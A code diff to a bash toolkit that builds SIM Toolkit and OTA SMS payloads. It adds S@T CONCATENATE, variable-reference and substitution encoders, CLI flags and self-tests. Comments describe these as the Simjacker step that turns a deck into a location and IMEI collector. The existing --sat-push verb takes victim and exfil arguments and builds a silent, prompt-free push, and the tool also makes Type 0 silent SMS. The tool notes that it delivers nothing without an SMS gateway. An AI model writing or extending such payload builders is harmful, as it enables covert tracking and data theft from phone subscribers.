@@ -1755,6 +1755,54 @@ otasm_sat_deck() {
     otasm_sat_tlv 01 "$value"
 }
 
+
+# Variable reference (S@T 01.00 §5.5.1, tag 0x08): the encapsulated form, whose
+# value is the variable's identification code. Distinct from the simple form of
+# §5.4.7, which is the bare byte and appears only inside a substitution.
+otasm_sat_varref() {
+    local varid
+    varid=$(otasm_norm_hex "${1:-}")
+    otasm_is_hex "$varid" && (( ${#varid} == 2 )) || {
+        printf 'ERROR\tS@T variable reference needs a one-octet variable id\n' >&2; return 2; }
+    otasm_sat_tlv 08 "$varid"
+}
+
+# Substitution (S@T 01.00 §5.4.8): a length field of 0xFF means "the value is not
+# here, it is in this variable". This is how a terminal response -- a location, an
+# IMEI -- gets into an outgoing message, and it is the half of Simjacker that
+# turns a deck into a collector. The tag is the tag of whatever the parameter
+# would have been, because only its value is replaced.
+otasm_sat_substitution() {
+    local tag varid
+    tag=$(otasm_norm_hex "${1:-}"); varid=$(otasm_norm_hex "${2:-}")
+    otasm_is_hex "$tag" && (( ${#tag} == 2 )) || {
+        printf 'ERROR\tS@T substitution needs a one-octet tag\n' >&2; return 2; }
+    otasm_is_hex "$varid" && (( ${#varid} == 2 )) || {
+        printf 'ERROR\tS@T substitution needs a one-octet variable id\n' >&2; return 2; }
+    otasm_is_hex "$tag${varid}"
+    printf '%sFF%s\n' "${tag,,}" "${varid,,}"
+}
+
+# Concatenate (S@T 01.00 §6.2.4, tag 0x24): destination variable first, then two
+# or more values, each either a variable reference (tag 0x08) or an inline value
+# (tag 0x0A). The result is in LV form and sits in the destination variable.
+otasm_sat_concat() {
+    local dest varid value body
+    dest=$(otasm_norm_hex "${1:-}")
+    otasm_is_hex "$dest" && (( ${#dest} == 2 )) || {
+        printf 'ERROR\tS@T CONCATENATE needs a one-octet destination variable\n' >&2; return 2; }
+    [[ $# -ge 3 ]] || {
+        printf 'ERROR\tS@T CONCATENATE needs at least two values\n' >&2; return 2; }
+    value="${dest,,}"
+    shift
+    for varid in "$@"; do
+        [[ -z "$varid" ]] && continue
+        body=$(otasm_sat_varref "$varid") || return 2
+        value+="$body"
+    done
+    otasm_sat_tlv 24 "$value"
+}
+
 # Generic push command (S@T 01.23 §6.1): the push tag around the deck. No push
 # name element, so the browser puts no prompt in front of the user -- which is
 # the whole point of the low priority push of §7.
@@ -1937,7 +1985,8 @@ otasm_sat_push_build() {
 
     printf 'limit\t%s\n' 'the card S@T browser is not modelled: what the deck does needs EF_SST service 26 (SMS-PP download) and 29 (proactive UICC) enabled and a S@T applet present'
     printf 'limit\t%s\n' 'no delivery: an SMSC or OTA gateway is needed, so sent is 0 by construction'
-    printf 'limit\t%s\n' 'the deck requests location and IMEI into card variables and sends a fixed body; binding the returned terminal response into the outbound SMS needs S@T CONCATENATE and varref encoding, which this verb does not build'
+    printf 'limit\t%s\n' 'the deck sends a fixed body: the CONCATENATE (§6.2.4), variable-reference (§5.5.1) and substitution (§5.4.8) encodings are built and are reachable as --sat-concat, --sat-varref and --sat-subst, but a deck that binds them needs the card to place a terminal response into a variable, and PROVIDE LOCAL INFORMATION returns its datum in the terminal response rather than into a named variable this tree can point at'
+    printf 'note\t%s\n' 'a variable-bound exfiltration body is therefore assembled by hand from those three verbs, not emitted by --sat-push: the push this verb builds is the fixed-body form the public Simjacker samples use'
     printf 'limit\t%s\n' 'SPI 0000 is the no-security form the public SIMjacker samples use; the S@T-recommended 1200 form is built on request and needs OTASM_KID_KEY'
     printf 'limit\t%s\n' 'no CAT_TP / 23.048 address-addressed carrier: this is the SMS TP-UD form only'
     printf 'note\t%s\n' 'no 0xD0 octet is on the wire: the rendered_d0_* rows are the commands the card emits toward the terminal when the browser runs each macro (S@T 01.00 §6.2.9), not the transport envelope'
@@ -3019,6 +3068,15 @@ otasm_selftest() {
     chk sat-card-head "$(printf '%s' "$(fld "$sp" card_hex)" | cut -c1-10)" "0528060101"
     chk sat-deck-head "$(printf '%s' "$(fld "$sp" deck_hex)" | cut -c1-10)" "012d020101"
     chk sat-push-head "$(printf '%s' "$(fld "$sp" push_hex)" | cut -c1-4)" "422f"
+    # S@T 01.00 §5.5.1: the encapsulated variable reference is 08, length 01, id.
+    chk sat-varref        "$(otasm_cli_main --sat-varref 01 2>/dev/null)" 080101
+    # §6.2.4: 24, length, destination variable, then the values as references.
+    # 7 = 1 (dest 03) + 3 (08 01 01) + 3 (08 01 02).
+    chk sat-concat        "$(otasm_cli_main --sat-concat 03 01 02 2>/dev/null)" 240703080101080102
+    chk sat-concat-short  "$(otasm_cli_main --sat-concat 03 01 >/dev/null 2>&1; echo $?)" 2
+    # §5.4.8: length 0xFF means the value lives in the named variable.
+    chk sat-subst         "$(otasm_cli_main --sat-subst 0B 03 2>/dev/null)" 0bFF03
+    chk sat-varref-long   "$(otasm_cli_main --sat-varref 0102 >/dev/null 2>&1; echo $?)" 2
     # TS 31.115 §4.2 header: CPL 003f (63 = 14 + 49), CHL 0d (13 = SPI 2 + KIc 1
     # + KID 1 + TAR 3 + CNTR 5 + PCNTR 1), SPI 0000, KIc 00, KID 00, TAR 505348
     # (S@T 01.23 §7 "PSH"), CNTR 0000000000, PCNTR 00.
@@ -3349,6 +3407,9 @@ otasm_cli_main() {
         --type0-build)    otasm_type0_build "${1:-}" "${2:-}" "${3:-00}" ;;
         --type0)          otasm_type0_audit "${1:-}" ;;
         --sat-push)       otasm_sat_push_build "${1:-}" "${2:-}" "${3:-}" ;;
+        --sat-concat)     otasm_sat_concat "${1:-}" "${@:2}" ;;
+        --sat-subst)      otasm_sat_substitution "${1:-}" "${2:-}" ;;
+        --sat-varref)     otasm_sat_varref "${1:-}" ;;
         --wib-push)       otasm_wib_push ;;
         --plan)           otasm_plan ;;
         --plan-tp)        otasm_plan_tp ;;
@@ -3394,6 +3455,9 @@ Usage: $0 COMMAND
   --type0-build [oa] [scts] [dcs]    build a Type 0 silent SMS-DELIVER
   --type0 <hex>                      audit a TPDU for the Type 0 properties
   --sat-push [<victim>] [<exfil>] [<spi>]
+  --sat-concat <dest-var> <var>...   S@T CONCATENATE byte code (01.00 6.2.4)
+  --sat-varref <var>                 S@T variable reference TLV (01.00 5.5.1)
+  --sat-subst <tag> <var>            S@T substitution: value lives in <var> (01.00 5.4.8)
                                      build the SIMjacker-shape S@T push: a S@T
                                      deck of 0x2d STK macros in a TS 31.115
                                      packet (TAR 505348) inside an SMS-SUBMIT
